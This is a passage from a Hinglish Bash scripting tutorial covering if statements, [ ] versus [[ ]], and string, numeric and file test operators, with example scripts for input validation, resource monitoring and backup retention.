if [ $DISK_STATUS -eq 0 ] && [ $APACHE_STATUS -eq 0 ] && [ $MYSQL_STATUS -eq 0 ]; then
    echo ""
    echo "✓ All systems operational"
    exit 0
else
    echo ""
    echo "⚠️  Some issues detected"
    exit 1
fi
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Spaces bhoolna:** `if [$a -eq 5]` galat, `if [ $a -eq 5 ]` sahi
- ❌ **`fi` bhoolna:** Har `if` ko `fi` se close karo
- ❌ **Quotes nahi use karna:** `if [ $var = "text" ]` safer than `if [ $var = text ]`

### 10. **Best Practices / Pro Tips**
- 💡 **Hamesha quotes:** `"$var"` use karo
- 💡 **`[[` prefer karo:** Modern aur safer
- 💡 **Exit codes:** Functions se meaningful codes return karo
- 💡 **Indentation:** Readable code ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Backup script with validation

BACKUP_SOURCE="/data"
BACKUP_DEST="/backups"
MIN_SPACE_GB=10

# Check if source exists
if [ ! -d "$BACKUP_SOURCE" ]; then
    echo "✗ Source directory not found: $BACKUP_SOURCE"
    exit 1
fi

# Check if destination exists
if [ ! -d "$BACKUP_DEST" ]; then
    echo "Creating backup directory..."
    if mkdir -p "$BACKUP_DEST"; then
        echo "✓ Directory created"
    else
        echo "✗ Failed to create directory"
        exit 1
    fi
fi

# Check available space
AVAILABLE_GB=$(df "$BACKUP_DEST" | awk 'NR==2 {print int($4/1024/1024)}')

if [ $AVAILABLE_GB -lt $MIN_SPACE_GB ]; then
    echo "✗ Insufficient space: ${AVAILABLE_GB}GB available, ${MIN_SPACE_GB}GB required"
    exit 1
else
    echo "✓ Sufficient space: ${AVAILABLE_GB}GB available"
fi

# Create backup
echo "Creating backup..."
if tar -czf "$BACKUP_DEST/backup_$(date +%Y%m%d).tar.gz" "$BACKUP_SOURCE"; then
    echo "✓ Backup successful"
    exit 0
else
    echo "✗ Backup failed"
    exit 1
fi
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `if [ condition ]; then ... fi`
- ✅ `elif` multiple conditions ke liye
- ✅ `else` default action ke liye
- ✅ Spaces zaroori: `[ condition ]`
- ✅ Quotes use karo: `"$var"`

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `[` aur `[[` mein kya fark hai?**
A: `[[` modern, safer, aur zyada features. Next topic mein detail.

**Q2: Multiple conditions kaise check karu?**
A: `&&` (AND) ya `||` (OR) use karo: `if [ cond1 ] && [ cond2 ]`

**Q3: Nested if allowed hai?**
A: Haan, lekin readability ke liye limit karo.

### 14. **Practice ke liye Task**

```bash
# 1. File check
if [ -f "test.txt" ]; then
    echo "File exists"
else
    echo "File not found"
fi

# 2. Number comparison
num=50
if [ $num -gt 100 ]; then
    echo "Greater than 100"
elif [ $num -gt 50 ]; then
    echo "Greater than 50"
else
    echo "50 or less"
fi

# 3. String comparison
name="admin"
if [ "$name" = "admin" ]; then
    echo "Welcome admin"
else
    echo "Regular user"
fi

# 4. Multiple conditions
age=25
country="India"
if [ $age -ge 18 ] && [ "$country" = "India" ]; then
    echo "Eligible to vote"
fi
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔀 `if-elif-else` decisions ke liye
- 📏 Syntax: `if [ condition ]; then ... fi`
- 🔤 Spaces zaroori brackets ke andar
- 💬 Variables quote karo: `"$var"`
- ✅ Exit codes meaningful rakho

> **💡 Ye Zaroor Yaad Rakhein:**
> `if` statements scripting ka heart hain! Spaces yaad rakho `[ condition ]`, quotes use karo `"$var"`, aur `fi` se close karo!

---

## **Topic 2: Test Brackets (`[ ... ]` vs `[[ ... ]]`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Test Brackets** - Single aur double brackets ka difference samajhna.

### 2. **Ye Kya Hai? (What is it?)**
`[ ]` traditional test command hai (POSIX), `[[ ]]` Bash ka extended version hai jo zyada features aur safety deta hai. Modern scripts mein `[[ ]]` prefer kiya jaata hai.

**Analogy:** `[ ]` ek basic calculator hai, `[[ ]]` scientific calculator. Dono calculations kar sakte hain, lekin scientific mein zyada features aur safety hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Safety** - Word splitting issues avoid
- ✅ **Features** - Pattern matching, regex
- ✅ **Readability** - Cleaner syntax
- ✅ **Modern practice** - Industry standard

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Modern Bash scripts mein `[[ ]]`
- POSIX compatibility ke liye `[ ]`
- Pattern matching chahiye toh `[[ ]]`
- Regex chahiye toh `[[ ]]`

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Word splitting bugs
- Pattern matching nahi kar paoge
- Unsafe code
- Modern features miss karoge

### 6. **Syntax aur Common Options**

```bash
# Single brackets (POSIX)
if [ condition ]; then
    commands
fi

# Double brackets (Bash)
if [[ condition ]]; then
    commands
fi

# Key differences
[[ $var == pattern ]]    # Pattern matching
[[ $var =~ regex ]]      # Regex matching
[[ $var < $var2 ]]       # String comparison (no escaping)
```

**Main Differences:**
- `[[ ]]` - No word splitting
- `[[ ]]` - Pattern matching with `==`
- `[[ ]]` - Regex with `=~`
- `[[ ]]` - `&&` and `||` inside
- `[ ]` - POSIX compatible

### 7. **Example 1 (Basic)**

```bash
# Word splitting issue with [ ]
var="hello world"
if [ $var = "hello world" ]; then  # ERROR!
    echo "Match"
fi

# Safe with [[ ]]
if [[ $var = "hello world" ]]; then  # Works!
    echo "Match"
fi

# Pattern matching (only [[ ]])
file="document.txt"
if [[ $file == *.txt ]]; then
    echo "Text file"
fi

# Regex matching (only [[ ]])
email="user@example.com"
if [[ $email =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
    echo "Valid email"
fi

# Logical operators inside [[ ]]
age=25
country="India"
if [[ $age -ge 18 && $country == "India" ]]; then
    echo "Eligible"
fi
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# File validator using [[ ]]

validate_filename() {
    local filename=$1
    
    # Pattern matching
    if [[ $filename == *.txt || $filename == *.log ]]; then
        echo "✓ Valid text/log file"
    elif [[ $filename == *.jpg || $filename == *.png ]]; then
        echo "✓ Valid image file"
    else
        echo "✗ Unsupported file type"
        return 1
    fi
    
    # Length check
    if [[ ${#filename} -gt 255 ]]; then
        echo "✗ Filename too long"
        return 1
    fi
    
    # Invalid characters check (regex)
    if [[ $filename =~ [^a-zA-Z0-9._-] ]]; then
        echo "✗ Invalid characters in filename"
        return 1
    fi
    
    return 0
}

validate_email() {
    local email=$1
    local regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    if [[ $email =~ $regex ]]; then
        echo "✓ Valid email: $email"
        return 0
    else
        echo "✗ Invalid email: $email"
        return 1
    fi
}

validate_ip() {
    local ip=$1
    local regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    
    if [[ $ip =~ $regex ]]; then
        # Check each octet
        IFS='.' read -ra OCTETS <<< "$ip"
        for octet in "${OCTETS[@]}"; do
            if [[ $octet -gt 255 ]]; then
                echo "✗ Invalid IP: $ip"
                return 1
            fi
        done
        echo "✓ Valid IP: $ip"
        return 0
    else
        echo "✗ Invalid IP format: $ip"
        return 1
    fi
}

# Test validations
validate_filename "document.txt"
validate_filename "image.jpg"
validate_filename "file with spaces.txt"

validate_email "user@example.com"
validate_email "invalid-email"

validate_ip "192.168.1.1"
validate_ip "256.1.1.1"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`[ ]` mein pattern matching:** `[ $var == *.txt ]` kaam nahi karega
- ❌ **`[ ]` mein `&&`:** `[ cond1 && cond2 ]` galat, `[ cond1 ] && [ cond2 ]` sahi
- ❌ **Quotes bhoolna `[ ]` mein:** Word splitting issue

### 10. **Best Practices / Pro Tips**
- 💡 **Default: `[[ ]]`** - Modern scripts mein
- 💡 **POSIX need: `[ ]`** - Portable scripts ke liye
- 💡 **Pattern matching:** `[[ ]]` powerful hai
- 💡 **Regex:** `[[ ]]` mein `=~` use karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# User input validator

read -p "Enter username: " username
read -p "Enter email: " email
read -s -p "Enter password: " password
echo ""

# Username validation
if [[ ! $username =~ ^[a-z][a-z0-9_]{2,15}$ ]]; then
    echo "✗ Invalid username"
    echo "  - Must start with lowercase letter"
    echo "  - 3-16 characters"
    echo "  - Only lowercase, numbers, underscore"
    exit 1
fi

# Email validation
if [[ ! $email =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
    echo "✗ Invalid email format"
    exit 1
fi

# Password strength
if [[ ${#password} -lt 8 ]]; then
    echo "✗ Password too short (minimum 8 characters)"
    exit 1
fi

if [[ ! $password =~ [A-Z] ]]; then
    echo "✗ Password must contain uppercase letter"
    exit 1
fi

if [[ ! $password =~ [0-9] ]]; then
    echo "✗ Password must contain number"
    exit 1
fi

if [[ ! $password =~ [^a-zA-Z0-9] ]]; then
    echo "✗ Password must contain special character"
    exit 1
fi

echo "✓ All validations passed"
echo "Creating user account..."
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `[[ ]]` modern, safer (recommended)
- ✅ `[ ]` POSIX, portable
- ✅ `[[ ]]` - Pattern matching, regex
- ✅ `[[ ]]` - No word splitting
- ✅ `[[ ]]` - `&&`, `||` inside allowed

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Kab `[ ]` use karu, kab `[[ ]]`?**
A: Default `[[ ]]`. Sirf POSIX compatibility chahiye toh `[ ]`.

**Q2: Kya `[[ ]]` slower hai?**
A: Negligible difference. Safety aur features zyada important hain.

**Q3: Regex mein variables kaise use karu?**
A: `regex='pattern'; [[ $var =~ $regex ]]` (quotes mat do regex par)

### 14. **Practice ke liye Task**

```bash
# 1. Pattern matching
file="document.txt"
if [[ $file == *.txt ]]; then
    echo "Text file"
fi

# 2. Regex validation
email="test@example.com"
if [[ $email =~ ^[a-z]+@[a-z]+\.[a-z]+$ ]]; then
    echo "Valid email"
fi

# 3. Multiple conditions
age=25
name="admin"
if [[ $age -ge 18 && $name == "admin" ]]; then
    echo "Admin access granted"
fi

# 4. String comparison
str1="hello"
str2="world"
if [[ $str1 < $str2 ]]; then
    echo "$str1 comes before $str2"
fi

# 5. Number range
num=50
if [[ $num -ge 1 && $num -le 100 ]]; then
    echo "In range"
fi
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🆕 `[[ ]]` modern, feature-rich
- 🔒 No word splitting issues
- 🎯 Pattern matching: `==`
- 🔍 Regex: `=~`
- ✅ Default choice for Bash scripts

> **💡 Ye Zaroor Yaad Rakhein:**
> Modern Bash scripts mein hamesha `[[ ]]` use karo! Pattern matching, regex, aur safety - sab kuch better hai. POSIX compatibility chahiye tabhi `[ ]` use karo!

---

## **Topic 3: Test Conditions: String (`==`, `!=`, `-z`, `-n`, `<`, `>`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**String Tests** - Strings ko compare aur validate karna.

### 2. **Ye Kya Hai? (What is it?)**
String test operators strings ko compare karne aur validate karne ke liye use hote hain - equality check, empty check, alphabetical comparison, etc.

**Analogy:** Socho ki strings ko compare karna words ko dictionary mein check karne jaisa hai - kaunsa pehle aata hai, kaunsa baad mein, ya dono same hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Input validation** - User input check
- ✅ **String comparison** - Text matching
- ✅ **Empty checks** - Null/empty validation
- ✅ **Sorting logic** - Alphabetical order

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- User input validation
- Configuration parsing
- Text processing
- Conditional logic

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Input validation fail
- String bugs
- Security issues
- Logic errors

### 6. **Syntax aur Common Options**

```bash
# Equality
[[ $str1 == $str2 ]]
[[ $str1 = $str2 ]]     # Same as ==

# Inequality
[[ $str1 != $str2 ]]

# Empty string
[[ -z $str ]]           # True if empty
[[ -n $str ]]           # True if not empty

# Alphabetical comparison (in [[ ]])
[[ $str1 < $str2 ]]
[[ $str1 > $str2 ]]
```

**Important Operators:**
- `==` or `=` : Equal
- `!=` : Not equal
- `-z` : Zero length (empty)
- `-n` : Non-zero length (not empty)
- `<` : Less than (alphabetically)
- `>` : Greater than (alphabetically)

### 7. **Example 1 (Basic)**

```bash
# Equality
name="admin"
if [[ $name == "admin" ]]; then
    echo "Admin user"
fi

# Empty check
input=""
if [[ -z $input ]]; then
    echo "Input is empty"
fi

# Not empty
password="secret"
if [[ -n $password ]]; then
    echo "Password provided"
fi

# Alphabetical comparison
str1="apple"
str2="banana"
if [[ $str1 < $str2 ]]; then
    echo "$str1 comes before $str2"
fi
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# User registration validator

validate_input() {
    local field=$1
    local value=$2
    
    # Empty check
    if [[ -z $value ]]; then
        echo "✗ $field cannot be empty"
        return 1
    fi
    
    # Length check
    if [[ ${#value} -lt 3 ]]; then
        echo "✗ $field too short (minimum 3 characters)"
        return 1
    fi
    
    return 0
}

# Get user input
read -p "Username: " username
read -p "Email: " email
read -s -p "Password: " password
echo ""
read -s -p "Confirm password: " password2
echo ""

# Validate username
if ! validate_input "Username" "$username"; then
    exit 1
fi

# Validate email
if ! validate_input "Email" "$email"; then
    exit 1
fi

if [[ ! $email == *@*.* ]]; then
    echo "✗ Invalid email format"
    exit 1
fi

# Validate password
if ! validate_input "Password" "$password"; then
    exit 1
fi

# Password match
if [[ $password != $password2 ]]; then
    echo "✗ Passwords don't match"
    exit 1
fi

# Check username availability
EXISTING_USERS=("admin" "root" "test")
for user in "${EXISTING_USERS[@]}"; do
    if [[ $username == $user ]]; then
        echo "✗ Username already taken"
        exit 1
    fi
done

echo "✓ All validations passed"
echo "Creating account for: $username"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Quotes bhoolna:** `[[ $var == text ]]` safer than `[[ $var == text ]]`
- ❌ **`-z` aur `-n` confuse:** `-z` empty, `-n` not empty
- ❌ **`<` in `[ ]`:** Escape chahiye `\<`, `[[ ]]` mein direct use karo

### 10. **Best Practices / Pro Tips**
- 💡 **Hamesha quotes:** `"$var"` safe practice
- 💡 **Empty check pehle:** `-z` se validate karo
- 💡 **Case-insensitive:** `shopt -s nocasematch` use karo
- 💡 **Pattern matching:** `[[ $var == pattern* ]]`

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Configuration file parser

CONFIG_FILE="/etc/myapp/config.conf"

# Check if config exists
if [[ ! -f $CONFIG_FILE ]]; then
    echo "✗ Config file not found"
    exit 1
fi

# Parse configuration
while IFS='=' read -r key value; do
    # Skip empty lines
    [[ -z $key ]] && continue
    
    # Skip comments
    [[ $key == \#* ]] && continue
    
    # Trim whitespace
    key=$(echo "$key" | xargs)
    value=$(echo "$value" | xargs)
    
    # Validate key-value pairs
    if [[ -z $value ]]; then
        echo "⚠️  Empty value for: $key"
        continue
    fi
    
    # Process based on key
    case "$key" in
        "APP_NAME")
            if [[ -n $value ]]; then
                APP_NAME=$value
                echo "✓ App name: $APP_NAME"
            fi
            ;;
        "PORT")
            if [[ $value =~ ^[0-9]+$ ]]; then
                PORT=$value
                echo "✓ Port: $PORT"
            else
                echo "✗ Invalid port: $value"
            fi
            ;;
        "DEBUG")
            if [[ $value == "true" || $value == "false" ]]; then
                DEBUG=$value
                echo "✓ Debug: $DEBUG"
            else
                echo "✗ Invalid debug value: $value"
            fi
            ;;
    esac
done < "$CONFIG_FILE"

# Validate required fields
if [[ -z $APP_NAME ]]; then
    echo "✗ APP_NAME not configured"
    exit 1
fi

echo "✓ Configuration loaded successfully"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `==` equality, `!=` inequality
- ✅ `-z` empty, `-n` not empty
- ✅ `<` `>` alphabetical comparison
- ✅ Quotes use karo: `"$var"`
- ✅ Empty check pehle karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `=` aur `==` mein kya fark hai?**
A: Koi fark nahi, dono same hain. `==` zyada readable hai.

**Q2: Case-insensitive comparison kaise karu?**
A: `shopt -s nocasematch` set karo, phir `[[ $str1 == $str2 ]]`

**Q3: Substring check kaise karu?**
A: Pattern matching: `[[ $str == *substring* ]]`

### 14. **Practice ke liye Task**

```bash
# 1. Equality
name="admin"
[[ $name == "admin" ]] && echo "Match"

# 2. Empty check
input=""
[[ -z $input ]] && echo "Empty"

# 3. Not empty
data="hello"
[[ -n $data ]] && echo "Not empty"

# 4. Inequality
str1="hello"
str2="world"
[[ $str1 != $str2 ]] && echo "Different"

# 5. Alphabetical
[[ "apple" < "banana" ]] && echo "apple comes first"

# 6. Pattern matching
file="document.txt"
[[ $file == *.txt ]] && echo "Text file"

# 7. Substring check
text="Hello World"
[[ $text == *World* ]] && echo "Contains World"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔤 `==` equal, `!=` not equal
- 📭 `-z` empty, `-n` not empty
- 🔤 `<` `>` alphabetical order
- 💬 Quotes hamesha use karo
- 🎯 Pattern matching powerful hai

> **💡 Ye Zaroor Yaad Rakhein:**
> String tests mein hamesha quotes use karo! `-z` empty check, `-n` not empty. Pattern matching ke liye `[[ $var == pattern* ]]` use karo!

---

## **Topic 4: Test Conditions: Number (`-eq`, `-ne`, `-lt`, `-gt`, `-le`, `-ge`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Numeric Tests** - Numbers ko compare karna.

### 2. **Ye Kya Hai? (What is it?)**
Numeric test operators integers ko compare karne ke liye use hote hain - equal, not equal, less than, greater than, etc. Yeh mathematical comparisons ke liye hain.

**Analogy:** Socho ki numbers ko compare karna thermometer readings check karne jaisa hai - kaunsa zyada hai, kaunsa kam, ya dono same hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Numeric validation** - Age, size, count checks
- ✅ **Range checking** - Min/max validation
- ✅ **Thresholds** - Limits check karna
- ✅ **Counters** - Loop conditions

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Age validation
- File size checks
- Disk usage monitoring
- Loop counters

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Numeric validation fail
- Range errors
- Logic bugs
- Threshold violations

### 6. **Syntax aur Common Options**

```bash
# Equality
[[ $num1 -eq $num2 ]]

# Inequality
[[ $num1 -ne $num2 ]]

# Less than
[[ $num1 -lt $num2 ]]

# Greater than
[[ $num1 -gt $num2 ]]

# Less than or equal
[[ $num1 -le $num2 ]]

# Greater than or equal
[[ $num1 -ge $num2 ]]
```

**Operators:**
- `-eq` : Equal
- `-ne` : Not equal
- `-lt` : Less than
- `-gt` : Greater than
- `-le` : Less than or equal
- `-ge` : Greater than or equal

### 7. **Example 1 (Basic)**

```bash
# Age check
age=25
if [[ $age -ge 18 ]]; then
    echo "Adult"
else
    echo "Minor"
fi

# Range check
score=85
if [[ $score -ge 90 ]]; then
    echo "Grade A"
elif [[ $score -ge 80 ]]; then
    echo "Grade B"
elif [[ $score -ge 70 ]]; then
    echo "Grade C"
else
    echo "Grade F"
fi

# Equality
count=10
if [[ $count -eq 10 ]]; then
    echo "Count is exactly 10"
fi
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System resource monitor

# Disk usage check
check_disk() {
    local mount=$1
    local threshold=${2:-80}
    
    local usage=$(df "$mount" | awk 'NR==2 {print $5}' | sed 's/%//')
    
    echo "Disk usage on $mount: ${usage}%"
    
    if [[ $usage -ge 95 ]]; then
        echo "  🔴 CRITICAL: Disk almost full!"
        return 2
    elif [[ $usage -ge $threshold ]]; then
        echo "  🟡 WARNING: Disk usage high"
        return 1
    else
        echo "  🟢 OK"
        return 0
    fi
}

# Memory check
check_memory() {
    local threshold=${1:-80}
    
    local total=$(free | awk 'NR==2 {print $2}')
    local used=$(free | awk 'NR==2 {print $3}')
    local percent=$((used * 100 / total))
    
    echo "Memory usage: ${percent}%"
    
    if [[ $percent -ge 90 ]]; then
        echo "  🔴 CRITICAL: Memory almost full!"
        return 2
    elif [[ $percent -ge $threshold ]]; then
        echo "  🟡 WARNING: Memory usage high"
        return 1
    else
        echo "  🟢 OK"
        return 0
    fi
}

# Process count check
check_processes() {
    local max_processes=${1:-500}
    
    local count=$(ps aux | wc -l)
    
    echo "Running processes: $count"
    
    if [[ $count -gt $max_processes ]]; then
        echo "  🟡 WARNING: Too many processes"
        return 1
    else
        echo "  🟢 OK"
        return 0
    fi
}

# Port check
check_port() {
    local port=$1
    
    if [[ $port -lt 1 || $port -gt 65535 ]]; then
        echo "✗ Invalid port: $port (must be 1-65535)"
        return 1
    fi
    
    if nc -z localhost "$port" 2>/dev/null; then
        echo "✓ Port $port is open"
        return 0
    else
        echo "✗ Port $port is closed"
        return 1
    fi
}

# Run checks
echo "=== System Resource Monitor ==="
check_disk "/" 80
check_memory 80
check_processes 500
check_port 80
check_port 3306
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **String operators use karna:** `[[ $num == 5 ]]` galat, `[[ $num -eq 5 ]]` sahi
- ❌ **Non-numeric values:** Validate karo pehle
- ❌ **Floating point:** Bash sirf integers, `bc` use karo decimals ke liye

### 10. **Best Practices / Pro Tips**
- 💡 **Numeric operators:** `-eq`, `-ne`, etc. numbers ke liye
- 💡 **Validate first:** Check karo value numeric hai
- 💡 **Range checks:** `-ge` aur `-le` combine karo
- 💡 **Floating point:** `bc` ya `awk` use karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Backup retention policy

BACKUP_DIR="/backups"
MAX_BACKUPS=7
MAX_AGE_DAYS=30
MAX_SIZE_GB=100

echo "=== Backup Retention Check ==="

# Count backups
backup_count=$(ls -1 "$BACKUP_DIR"/backup_*.tar.gz 2>/dev/null | wc -l)
echo "Current backups: $backup_count"

if [[ $backup_count -gt $MAX_BACKUPS ]]; then
    echo "⚠️  Too many backups (max: $MAX_BACKUPS)"
    to_delete=$((backup_count - MAX_BACKUPS))
    echo "Deleting $to_delete oldest backups..."
    
    ls -t "$BACKUP_DIR"/backup_*.tar.gz | tail -n "$to_delete" | xargs rm -v
fi

# Check total size
total_size_kb=$(du -sk "$BACKUP_DIR" | cut -f1)
total_size_gb=$((total_size_kb / 1024 / 1024))

echo "Total size: ${total_size_gb}GB"

if [[ $total_size_gb -gt $MAX_SIZE_GB ]]; then
    echo "⚠️  Size limit exceeded (max: ${MAX_SIZE_GB}GB)"
    echo "Deleting oldest backups until under limit..."
    
    while [[ $total_size_gb -gt $MAX_SIZE_GB ]]; do
        oldest=$(ls -t "$BACKUP_DIR"/backup_*.tar.gz | tail -1)
        if [[ -z $oldest ]]; then
            break
        fi
        
        echo "Deleting: $oldest"
        rm "$oldest"
        
        total_size_kb=$(du -sk "$BACKUP_DIR" | cut -f1)
        total_size_gb=$((total_size_kb / 1024 / 1024))
    done
fi

# Check age
current_date=$(date +%s)
max_age_seconds=$((MAX_AGE_DAYS * 86400))

for backup in "$BACKUP_DIR"/backup_*.tar.gz; do
    [[ -f $backup ]] || continue
    
    backup_date=$(stat -c %Y "$backup")
    age_seconds=$((current_date - backup_date))
    age_days=$((age_seconds / 86400))
    
    if [[ $age_days -gt $MAX_AGE_DAYS ]]; then
        echo "Deleting old backup (${age_days} days): $(basename $backup)"
        rm "$backup"
    fi
done

echo "✓ Retention policy applied"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `-eq` equal, `-ne` not equal
- ✅ `-lt` less than, `-gt` greater than
- ✅ `-le` less/equal, `-ge` greater/equal
- ✅ Integer only, no decimals
- ✅ Validate numeric values first

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Floating point comparison kaise karu?**
A: `bc` use karo: `if (( $(echo "$a > $b" | bc -l) ))`

**Q2: Kya `>` aur `-gt` same hain?**
A: Nahi! `>` string comparison, `-gt` numeric comparison.

**Q3: Range check kaise karu?**
A: Combine karo: `[[ $num -ge 1 && $num -le 100 ]]`

### 14. **Practice ke liye Task**

```bash
# 1. Equality
num=10
[[ $num -eq 10 ]] && echo "Equal to 10"

# 2. Greater than
age=25
[[ $age -gt 18 ]] && echo "Adult"

# 3. Range check
score=85
if [[ $score -ge 80 && $score -le 90 ]]; then
    echo "Grade B"
fi

# 4. Not equal
count=5
[[ $count -ne 0 ]] && echo "Not zero"

# 5. Less than or equal
limit=100
value=50
[[ $value -le $limit ]] && echo "Within limit"

# 6. Multiple conditions
x=50
if [[ $x -gt 0 && $x -lt 100 ]]; then
    echo "In range 1-99"
fi
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔢 Numeric operators: `-eq`, `-ne`, `-lt`, `-gt`, `-le`, `-ge`
- ⚠️ Integer only, no floating point
- 📊 Range checks: combine operators
- ✅ Validate numeric values first
- 💡 Use `bc` for decimals

> **💡 Ye Zaroor Yaad Rakhein:**
> Numeric comparisons ke liye hamesha `-eq`, `-ne`, etc. use karo! `==` aur `>` string ke liye hain. Bash sirf integers handle karta hai!

---

## **Topic 5: Test Conditions: File (`-e`, `-d`, `-f`, `-s`, `-r`, `-w`, `-x`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**File Tests** - Files aur directories ko check karna.

### 2. **Ye Kya Hai? (What is it?)**
File test operators files aur directories ke existence, type, permissions, aur properties check karte hain. Yeh file operations se pehle validation ke liye essential hain.

**Analogy:** Socho ki file test ek security guard hai jo check karta hai - kya file hai? Kya folder hai? Kya aap read kar sakte hain? Kya write kar sakte hain?

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Safety** - File operations se pehle check
- ✅ **Error prevention** - Missing files handle
- ✅ **Permissions** - Access rights validate
- ✅ **Automation** - Smart file handling

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- File operations se pehle
- Permission checks
- Directory validation
- Backup scripts

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- File not found errors
- Permission denied errors
- Data loss (wrong file operations)
- Script failures

### 6. **Syntax aur Common Options**

```bash
# Existence
[[ -e path ]]    # Exists (file or directory)
[[ -f path ]]    # Regular file
[[ -d path ]]    # Directory

# Size
[[ -s path ]]    # Not empty (size > 0)

# Permissions
[[ -r path ]]    # Readable
[[ -w path ]]    # Writable
[[ -x path ]]    # Executable

# Special
[[ -L path ]]    # Symbolic link
[[ -b path ]]    # Block device
[[ -c path ]]    # Character device
```

**Common Operators:**
- `-e` : Exists
- `-f` : Regular file
- `-d` : Directory
- `-s` : Not empty
- `-r` : Readable
- `-w` : Writable
- `-x` : Executable

### 7. **Example 1 (Basic)**

```bash
# File exists
if [[ -f "config.txt" ]]; then
    echo "Config file found"
fi

# Directory exists
if [[ -d "/backups" ]]; then
    echo "Backup directory exists"
else
    mkdir -p "/backups"
fi

# File readable
if [[ -r "data.txt" ]]; then
    cat "data.txt"
else
    echo "Cannot read file"
fi

# File writable
if [[ -w "log.txt" ]]; then
    echo "New log entry" >> "log.txt"
fi

# File executable
if [[ -x "script.sh" ]]; then
    ./script.sh
else
    chmod +x script.sh
fi
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# File processor with comprehensive checks

process_file() {
    local file=$1
    
    # Existence check
    if [[ ! -e $file ]]; then
        echo "✗ File does not exist: $file"
        return 1
    fi
    
    # Type check
    if [[ -d $file ]]; then
        echo "✗ Is a directory, not a file: $file"
        return 1
    fi
    
    if [[ ! -f $file ]]; then
        echo "✗ Not a regular file: $file"
        return 1
    fi
    
    # Size check
    if [[ ! -s $file ]]; then
        echo "⚠️  File is empty: $file"
        return 1
    fi
    
    # Permission checks
    if [[ ! -r $file ]]; then
        echo "✗ File not readable: $file"
        return 1
    fi
    
    # All checks passed
    echo "✓ Processing: $file"
    
    # Get file info
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file")
    local perms=$(stat -c%a "$file" 2>/dev/null || stat -f%p "$file")
    
    echo "  Size: $size bytes"
    echo "  Permissions: $perms"
    
    # Process based on extension
    case "$file" in
        *.txt)
            echo "  Type: Text file"
            wc -l "$file"
            ;;
        *.log)
            echo "  Type: Log file"
            tail -10 "$file"
            ;;
        *.sh)
            if [[ -x $file ]]; then
                echo "  Type: Executable script"
            else
                echo "  Type: Script (not executable)"
            fi
            ;;
    esac
    
    return 0
}

# Backup function with checks
backup_file() {
    local source=$1
    local dest_dir=$2
    
    # Check source
    if [[ ! -f $source ]]; then
        echo "✗ Source file not found: $source"
        return 1
    fi
    
    # Check destination directory
    if [[ ! -d $dest_dir ]]; then
        echo "Creating backup directory: $dest_dir"
        mkdir -p "$dest_dir" || return 1
    fi
    
    # Check write permission
    if [[ ! -w $dest_dir ]]; then
        echo "✗ Cannot write to: $dest_dir"
        return 1
    fi
    
    # Create backup
    local filename=$(basename "$source")
    local backup_file="$dest_dir/${filename}.backup"
    
    if cp "$source" "$backup_file"; then
        echo "✓ Backup created: $backup_file"
        return 0
    else
        echo "✗ Backup failed"
        return 1
    fi
}

# Process multiple files
for file in "$@"; do
    process_file "$file"
    echo ""
done
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Check nahi karna:** Direct operations dangerous
- ❌ **`-e` aur `-f` confuse:** `-e` anything, `-f` regular file only
- ❌ **Permissions ignore:** Read/write check zaroori

### 10. **Best Practices / Pro Tips**
- 💡 **Hamesha check karo:** File operations se pehle
- 💡 **Specific tests:** `-f` better than `-e` for files
- 💡 **Permission checks:** `-r`, `-w`, `-x` use karo
